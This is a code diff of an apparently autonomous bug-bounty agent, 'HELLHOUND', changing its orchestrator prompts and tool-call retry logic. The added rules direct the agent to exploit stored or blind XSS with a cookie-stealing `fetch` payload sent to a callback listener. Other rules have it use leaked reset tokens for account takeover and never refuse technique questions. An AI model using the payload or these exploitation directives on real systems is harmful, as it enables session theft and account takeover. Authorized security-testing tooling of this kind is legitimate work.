+                path_scope_prompt = f"\nACTIVE LAB PATH SCOPE: '{self._turn_path_scope}' (ALL tool URLs MUST begin with 'https://{self._display_host}{self._turn_path_scope}/...'; root '/' and other paths are out of scope)\n"
 
             known_eps = (self.target.state.get("endpoints") or [])[:35]
             known_params = (self.target.state.get("spider_intel") or {}).get("parameters", [])[:15]
@@ -4332,14 +4814,14 @@ class Agent:
 
             path_rule = ""
             if self._turn_path_scope:
-                path_rule = f"\n8. CRITICAL: The active application is scoped strictly to '{self._turn_path_scope}'. All tool URLs MUST start with 'https://{self.target.name}{self._turn_path_scope}/...' (e.g. 'https://{self.target.name}{self._turn_path_scope}/dashboard' or 'https://{self.target.name}{self._turn_path_scope}/api/auth/login'). Never query out-of-scope paths."
+                path_rule = f"\n8. CRITICAL: The active application is scoped strictly to '{self._turn_path_scope}'. All tool URLs MUST start with 'https://{self._display_host}{self._turn_path_scope}/...' (e.g. 'https://{self._display_host}{self._turn_path_scope}/dashboard' or 'https://{self._display_host}{self._turn_path_scope}/api/auth/login'). Never query out-of-scope paths."
 
             return f"""\
 You are HELLHOUND Orchestrator. Your sole job is to evaluate if a tool should be executed next or if tool execution is complete.
 
 NON-NEGOTIABLE, before anything else in this prompt: every response you give is EITHER pure tool-call JSON (`{{"tool": ..., "args": ...}}`, nothing else — no lead-in sentence, no "let me...", no "I'll now...") OR the literal word DONE. Never describe an action you're about to take in prose — describing it is not doing it, and the person you're working for gets nothing if you only narrate. If you find yourself writing "let me", "I'll", "I will now", "I need to", "I should", "First I", "Starting with", "Let me check", "Let me run", "proceed to", or any other forward-looking action language — stop, delete that sentence, and emit the JSON instead. Any response that contains English prose describing a planned action WITHOUT a JSON tool-call block is treated as a FAILURE and will be discarded. The full rules below explain HOW to decide what to do; this line governs the actual shape of every single response regardless of what those rules say.
 
-TARGET: {self.target.name}
+TARGET: {self._display_host}
 RESEARCHER MISSION & OBJECTIVE: {original_user_text}
 SCOPE: {scope_summary}{path_scope_prompt}
 {artifact_header}
@@ -4357,7 +4839,7 @@ ALREADY GATHERED THIS SESSION (do not re-run a tool to re-discover this):
 RULES:
 1. DECISION & TOOL SELECTION (CRITICAL):
    - TARGET VALIDITY & LOCAL QUERIES: If TARGET is "default" or no valid resolvable domain is scoped, NEVER generate network tools (curl, spider, subfinder, httpx, etc.). Output "DONE" immediately.
-   - CONVERSATIONAL & EDUCATIONAL QUERIES: If the user's message is a question, discussion, explanation request, concept breakdown, methodology inquiry (e.g. "explain...", "how does...", "what is...", "why did..."), OR a plain greeting/small talk/capability question with no testing request in it at all (e.g. "hi", "hello", "hey", "what can you do", "who are you", "how does this work") — output "DONE" immediately with a normal conversational reply. Being the first message in a session, or a target already being scoped, is NOT on its own a reason to start testing — the message itself has to actually ask for that.
+   - CONVERSATIONAL & EDUCATIONAL QUERIES — DECIDE BY THIS TEST, NOT BY MATCHING EXAMPLE PHRASES: Before considering any tool, ask yourself: "Can I fully and correctly answer THIS message using only what's already in ALREADY GATHERED THIS SESSION / conversation history, with zero new information from the target?" If yes — it's a question, a request to explain/recap something already done, an identity/capability/greeting question, a methodology question, anything answerable from existing context — output "DONE" immediately with a normal conversational reply. Only emit a tool call if answering genuinely requires NEW data or a NEW action against the target that isn't already sitting in front of you. Illustrative (not exhaustive) examples of the "no new data needed" case: "explain...", "how does...", "what is...", "why did...", "hi", "hello", "what can you do", "who are you", "who am i", "what's my name", "how does this work", "why did that fail", "what did you find". This test applies EVEN IF a target is already active and tools were run earlier in the session — an ongoing mission does not mean every subsequent message is part of it; judge THIS message on its own, by whether IT needs new data, not by session momentum. Being the first message in a session, or a target already being scoped, is NOT on its own a reason to start testing — the message itself has to actually require new information.
    - ONLY emit a tool call when active reconnaissance, probing, scanning, or exploitation against a valid, in-scope target endpoint is required right now.
 
 2. MISSION OBJECTIVE FIDELITY & AUTONOMOUS EXPLOIT PROGRESSION (CRITICAL):
@@ -4428,10 +4910,20 @@ RULES:
      l) Pivot across discovered endpoints and HTTP verbs (GET, POST, PUT, PATCH, DELETE).
      m) NESTED PAYLOAD & DEBUG DISCLOSURE INSPECTION (CRITICAL):
         When sending requests to authentication, password reset, account recovery, registration, or API endpoints, NEVER inspect top-level status messages (e.g. "message": "link sent") in isolation. Response payloads, debug objects, or UI notification previews frequently embed sensitive tokens, password reset URLs, temporary credentials, or administrative keys in nested keys (e.g. "notification", "preview", "debug", "data", "result", "user"). If a tool result contains "LEAK_ALERT" or "harvested_security_artifacts", YOU MUST IMMEDIATELY extract and use those tokens/links to perform the password reset or login! NEVER claim "no leakage" when tokens or reset links are present in the response body!
-     n) SKILL PRIORITIZATION FOR TARGETED OBJECTIVES:
+     n) BLIND / STORED XSS & OTHER OUT-OF-BAND (OOB) CONFIRMATION:
+        - When a payload will execute somewhere you can't directly observe the response (a stored XSS reviewed by an admin/bot backend, a blind SSRF/SQLi/XXE, or any injection where success has to be proven by the TARGET calling back to you instead of by reading its HTTP response):
+          * For XSS specifically, `load_skill(name="xss")` FIRST (see n2 below) — it covers payload selection, filter/sanitizer bypass, and headless-reviewer detection, all of which should inform the payload before a listener is even needed.
+          * Call `listener(action="start")` to get a live callback URL.
+          * Embed that URL in the payload with a unique random token in the callback path/query (e.g. `<script>fetch('<listener_url>/c?tok=<random>&x='+document.cookie)</script>` to steal a cookie via a reviewing bot/admin).
+          * Deliver the payload (submit the form/survey/comment that gets reviewed).
+          * Call `listener(action="poll", token="<same random token>")` to check whether the target called back and see the exfiltrated data.
+          * Do NOT assume a stored/blind payload succeeded or failed just because the immediate HTTP response to your own submission was 200/302 — that response is from submitting the payload, not from it executing. The listener poll is the actual proof.
+     n2) SKILL PRIORITIZATION FOR TARGETED OBJECTIVES:
         - Account Takeover / Password Reset / Auth Flaws -> IMMEDIATELY call `load_skill(name="auth-bypass")` as your very first tool call.
         - Owner Console / Privilege Escalation / Admin Access -> IMMEDIATELY call `load_skill(name="access-control")` as your very first tool call.
         - Parameter Pollution / Debug Leakage -> IMMEDIATELY call `load_skill(name="server-side-parameter-pollution")` as your very first tool call.
+        - Cross-Site Scripting (reflected/stored/DOM/blind XSS, cookie/session theft via injected script, "exploit the XSS" objectives) -> IMMEDIATELY call `load_skill(name="xss")` as your very first tool call, BEFORE starting a listener or attempting any payload.
+        - IDOR / Insecure Direct Object Reference (sequential IDs, GraphQL node substitution, cross-tenant/cross-user object access, "access another user's data" objectives) -> IMMEDIATELY call `load_skill(name="idor")` as your very first tool call.
         - DO NOT load `bb-methodology` or run 60-second broad spiders when given a specific target objective!
 
 5. Strict Verification Gate, Visual Proof & Finding Recording (gowitness / record_finding):
@@ -4527,7 +5019,7 @@ The researcher explicitly requested a formal report. Provide a structured, profe
             light_context_block = f"""
 CURRENT SESSION CONTEXT (background only — do not mention scope, targets, or
 status mechanics unless the researcher's message is actually about them):
-TARGET: {self.target.name}
+TARGET: {self._display_host}
 SCOPE: {scope_summary}
 FINDINGS SO FAR: {len(self.target.findings)}{artifact_block_synth}"""
 
@@ -4589,7 +5081,7 @@ INSTRUCTIONS:
 {custom_synth_persona}
 
 {researcher_line}
-TARGET: {self.target.name}
+TARGET: {self._display_host}
 SCOPE CONSTRAINTS: {scope_summary}{path_scope_synth}
 CURRENT FINDINGS: {len(self.target.findings)} verified findings
 {artifact_block_synth}
@@ -4616,6 +5108,7 @@ INSTRUCTIONS:
 - When asked about your capabilities, tools, or what you can do: answer ONLY from the AVAILABLE TOOLS list above. Never claim access to external tools not in that list.
 - EDUCATIONAL & TECHNIQUE QUERIES: When the researcher asks about offensive security techniques (e.g. 403 bypass, IDOR, SQLi, XSS, SSRF, JWT attacks, auth bypass, privilege escalation, parameter pollution), provide comprehensive, detailed technical explanations with concrete examples, payloads, headers, and methodology. This is educational content essential to bug bounty work — NEVER refuse to explain a technique. You are a bug bounty assistant, not a content filter.
 - OUTPUT FORMAT: Respond in plain natural-language prose with clean markdown structure (headings, bullet points, and code blocks for evidence/PoC). NEVER output a raw tool-call object.
+- VOICE: Talk directly TO the researcher, second person ("you asked me to...", "I tried...", "your session cookie..."). Never narrate about them in third person ("the researcher instructed...", "the researcher's goal was..." ) — that's report-doc phrasing, not how you'd actually talk to the person sitting across from you. Save strict third-person, formal phrasing for an actual generated HackerOne report artifact, not a normal reply.
 """
 
         turn_start_idx = len(self.history)
@@ -4729,6 +5222,14 @@ INSTRUCTIONS:
                         except Exception:
                             pass
 
+                # Balanced-brace scan — catches tool-call JSON that's well-formed
+                # except for stray trailing content after it (e.g. one extra
+                # '}'), which the older greedy regexes below fail on outright.
+                if not tool_call and isinstance(ai_resp, str) and '"tool"' in ai_resp:
+                    parsed = _extract_first_balanced_json(ai_resp)
+                    if isinstance(parsed, dict) and "tool" in parsed:
+                        tool_call = parsed
+
                 if not tool_call and isinstance(ai_resp, str):
                     tool_json_match = re.search(r'(\{\s*"tool"\s*:\s*[\s\S]*\})', ai_resp)
                     if tool_json_match:
@@ -4819,6 +5320,31 @@ INSTRUCTIONS:
                     user_text = f"Tool '{unregistered_name}' is invalid. Please select from available tools: {', '.join(TOOL_REGISTRY.keys())}"
                     continue
 
+                elif isinstance(ai_resp, str) and '"tool"' in ai_resp and _narration_retry_count < 5:
+                    # It was clearly attempting a tool call (has a "tool" key)
+                    # but every extraction attempt above — including the
+                    # balanced-brace scanner — still failed to parse it as
+                    # valid JSON. This used to fall straight through to the
+                    # narration check (which won't catch it, there's no
+                    # narration wording here) and then to `break`, leaking
+                    # the raw broken JSON to the researcher as if it were the
+                    # final answer, with the intended tool call never run.
+                    # Force a clean retry instead of silently giving up.
+                    _narration_retry_count += 1
+                    self.history.append({"role": "assistant", "content": ai_resp})
+                    self.history.append({
+                        "role": "user",
+                        "content": (
+                            "SYSTEM: That was not valid JSON — it looked like a tool call "
+                            "but failed to parse (check for mismatched braces/quotes, "
+                            "especially inside string args like payload content). "
+                            "Resend the SAME tool call as a single valid JSON object, "
+                            "nothing else before or after it."
+                        )
+                    })
+                    user_text = "Resend the tool call as valid JSON only."
+                    continue
+
                 # Non-tool response — could be a genuine "DONE"/conversational
                 # reply, OR the model narrating an intended action instead of
                 # actually emitting the tool-call JSON (e.g. "Let me check the
@@ -4852,14 +5378,14 @@ INSTRUCTIONS:
                     _narration_retry_count += 1
                     self.history.append({"role": "assistant", "content": ai_resp})
                     # Build a target-aware example so the model knows what to emit
-                    _target_url = self.target.name
+                    _target_url = self._display_host
                     if not _target_url.startswith(("http://", "https://")):
                         _target_url = f"http://{_target_url}"
                     self.history.append({
                         "role": "user",
                         "content": (
                             f"SYSTEM: Your previous text was DISCARDED — it performed no action and produced no results. "
-                            f"The target is '{self.target.name}'. The mission is: '{original_user_text}'. "
+                            f"The target is '{self._display_host}'. The mission is: '{original_user_text}'. "
                             f"Emit ONLY tool-call JSON. Example: "
                             f'{{"tool": "curl", "args": {{"url": "{_target_url}", "method": "GET"}}}}. '
                             f"No English text. No explanation. No preamble. Just the raw JSON object."
@@ -4883,36 +5409,69 @@ INSTRUCTIONS:
                     user_text = "Emit the tool-call JSON or DONE."
                     continue
 
-                # Safety net: all narration retries exhausted, zero tools executed,
-                # real target exists — auto-inject a starter curl probe rather than
-                # giving up with zero work done.
-                if not tools_executed and has_real_target and _narration_retry_count >= 5:
-                    _target_url = self.target.name
-                    if not _target_url.startswith(("http://", "https://")):
-                        _target_url = f"http://{_target_url}"
-                    tool_call = {"tool": "curl", "args": {"url": _target_url, "method": "GET"}}
-                    t_name = tool_call["tool"]
-                    t_args = tool_call["args"]
-                    tools_executed.append(t_name)
-                    if emit and hasattr(emit, "set_label"):
-                        emit.set_label(f"Let me cook — probing {self.target.name}")
-                    if emit and hasattr(emit, "tool_start"):
-                        emit.tool_start(t_name, t_args)
-                    elif emit and hasattr(emit, "info"):
-                        emit.info(f"[*] Auto-probe: {t_name} {t_args}")
-                    tool_result = self.execute_tool_call(t_name, t_args, emit)
-                    if emit and hasattr(emit, "tool_result"):
-                        emit.tool_result(t_name, tool_result)
-                    self.history.append({"role": "assistant", "content": '{"tool": "curl", "args": ' + json.dumps(t_args) + '}'})
-                    self.history.append({
-                        "role": "user",
-                        "content": f"[TOOL RESULT: {t_name}]\n{json.dumps(tool_result, indent=2)}"
-                    })
-                    user_text = f"Tool '{t_name}' returned results. Analyze these findings and choose the next tool or output 'DONE'."
-                    _narration_retry_count = 0  # Reset for the next phase
-                    continue
+                # Safety net: narration retries exhausted, real target exists.
+                # Previously this only fired when ZERO tools had executed yet
+                # this turn — so a turn that ran a setup tool (e.g.
+                # listener(action=start)) and then got stuck narrating its next
+                # step ("next I will probe the survey endpoint...") never hit
+                # this recovery; it just fell straight to synthesis with the
+                # setup done but the actual exploit attempt never made,
+                # producing a "here's my plan" answer instead of a result.
+                # Now it fires either way — zero tools gets the generic bootstrap
+                # probe as before; some-tools-already-run gets a stronger,
+                # mission-specific push instead of being handed to synthesis.
+                if has_real_target and _narration_retry_count >= 5:
+                    if not tools_executed:
+                        _target_url = self._display_host
+                        if not _target_url.startswith(("http://", "https://")):
+                            _target_url = f"http://{_target_url}"
+                        tool_call = {"tool": "curl", "args": {"url": _target_url, "method": "GET"}}
+                        t_name = tool_call["tool"]
+                        t_args = tool_call["args"]
+                        tools_executed.append(t_name)
+                        if emit and hasattr(emit, "set_label"):
+                            emit.set_label(f"Let me cook — probing {self._display_host}")
+                        if emit and hasattr(emit, "tool_start"):
+                            emit.tool_start(t_name, t_args)
+                        elif emit and hasattr(emit, "info"):
+                            emit.info(f"[*] Auto-probe: {t_name} {t_args}")
+                        tool_result = self.execute_tool_call(t_name, t_args, emit)
+                        if emit and hasattr(emit, "tool_result"):
+                            emit.tool_result(t_name, tool_result)
+                        self.history.append({"role": "assistant", "content": '{"tool": "curl", "args": ' + json.dumps(t_args) + '}'})
+                        self.history.append({
+                            "role": "user",
+                            "content": f"[TOOL RESULT: {t_name}]\n{json.dumps(tool_result, indent=2)}"
+                        })
+                        user_text = f"Tool '{t_name}' returned results. Analyze these findings and choose the next tool or output 'DONE'."
+                        _narration_retry_count = 0  # Reset for the next phase
+                        continue
+                    elif _narration_retry_count < 8:
+                        # Some tool(s) already ran but it's still describing the
+                        # next step instead of doing it. Push harder, quoting
+                        # exactly what's already been run and what was asked for,
+                        # rather than silently handing an "infra set up, exploit
+                        # never attempted" turn to synthesis.
+                        _narration_retry_count += 1
+                        self.history.append({"role": "assistant", "content": ai_resp})
+                        self.history.append({
+                            "role": "user",
+                            "content": (
+                                f"SYSTEM: You keep describing the next step instead of doing it. "
+                                f"You already ran: {', '.join(tools_executed)}. "
+                                f"The mission is still: '{original_user_text}'. "
+                                f"Emit ONLY the next tool-call JSON that actually attempts it — "
+                                f"no narration, no plan, no explanation."
+                            )
+                        })
+                        user_text = "Execute the tool now — respond with ONLY the JSON."
+                        continue
+                    # Even the extra pushes didn't produce a real tool call —
+                    # genuinely stuck. Fall through to synthesis with whatever
+                    # was gathered, same as the original behavior.
 
                 break
+
 
         # ── 4. Final Answer Generation (Streaming, Fast & Context-Specific) ───────
         if emit and hasattr(emit, "set_label"):
@@ -4973,11 +5532,48 @@ INSTRUCTIONS:
                     answer, tok = None, tok
             return answer, tok
 
-        if not tools_executed:
+        # ── Interrupted-turn short-circuit ──────────────────────────────
+        # Ctrl+C sets cancel_check(); the orchestrator loop above stops
+        # calling new tools once it notices, but before this fix the code
+        # fell straight into the normal "turn completed" synthesis prompts
+        # below — which assume a natural DONE and can lead the synthesizer
+        # to echo a stray tool-call-shaped JSON object back as prose (seen
+        # as "(Suggested next tool: ...)" in the transcript). Give it an
+        # explicit interrupted framing instead so it reports what was
+        # actually gathered before the cancel, and says plainly that the
+        # turn was interrupted rather than pretending it finished.
+        _was_cancelled = bool(cancel_check and cancel_check())
+
+        if _was_cancelled:
+            if tools_executed:
+                synth_prompt = (
+                    f"The researcher interrupted this analysis (Ctrl+C) before it "
+                    f"reached a conclusion.\n\n"
+                    f"Tools executed before the interrupt: {', '.join(tools_executed)}.\n\n"
+                    f"Summarize plainly what was gathered from those tool results so "
+                    f"far — what was tried, what was observed, anything found. State "
+                    f"clearly at the start that this analysis was interrupted and is "
+                    f"not a finished or conclusive result. Do NOT invent a status, a "
+                    f"suggested next tool call, or claim anything was achieved beyond "
+                    f"what the tool results above actually show."
+                )
+            else:
+                synth_prompt = (
+                    "The researcher interrupted this turn (Ctrl+C) before any tool "
+                    "ran or a result was produced. Briefly acknowledge the "
+                    "interruption and ask what they'd like to do next — do not "
+                    "invent findings or a summary, since nothing was actually run."
+                )
+
+            final_answer, tokens = _ask_synthesizer(
+                synth_prompt,
+                self._get_trimmed_history(max_turns=6, for_chat=False, turn_start_idx=turn_start_idx)
+            )
+        elif not tools_executed:
             if report_requested and has_critical_findings:
                 synth_prompt = (
                     f"The researcher requested: \"{original_user_text}\"\n\n"
-                    f"Target: '{self.target.name}'.\n"
+                    f"Target: '{self._display_host}'.\n"
                     f"Generate the complete, professional HackerOne vulnerability report based on the confirmed findings and evidence gathered for this target."
                 )
             else:
